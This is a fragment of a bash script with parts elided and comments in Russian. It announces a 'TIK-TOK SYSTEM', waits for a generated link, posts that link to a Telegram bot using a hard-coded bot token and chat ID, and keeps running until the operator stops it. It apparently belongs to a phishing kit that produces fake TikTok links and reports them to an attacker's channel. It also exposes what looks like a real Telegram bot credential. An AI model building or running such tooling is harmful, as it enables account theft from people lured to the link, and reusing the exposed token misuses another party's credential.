...
clear
echo -e "\e[1;32m[!] TIK-TOK SYSTEM DEPLOYED\e[0m"
...
while true; do
    ...
    if [ ! -z "$LINK" ] && [ "$SENT" = false ]; then
        sleep 8
        curl -s -X POST "https://api.telegram.org/bot8749123902:AAGnWBYBrUj4pHcE2btDjtBqpMVKMFQB7yQ/sendMessage" -d chat_id="-1003463348834" -d text="✅ Ссылка TikTok готова: $LINK" > /dev/null 2>&1
        echo -e "\e[1;32m[+] Ссылка отправлена в Telegram.\e[0m"
        echo -e "\e[1;33m[!] СИСТЕМА АКТИВНА. НЕ ЗАКРЫВАЙ ЭТО ОКНО.\e[0m"
        SENT=true
    fi
    # Скрипт не выйдет, пока ты сам не нажмешь Ctrl+C
    sleep 5
done
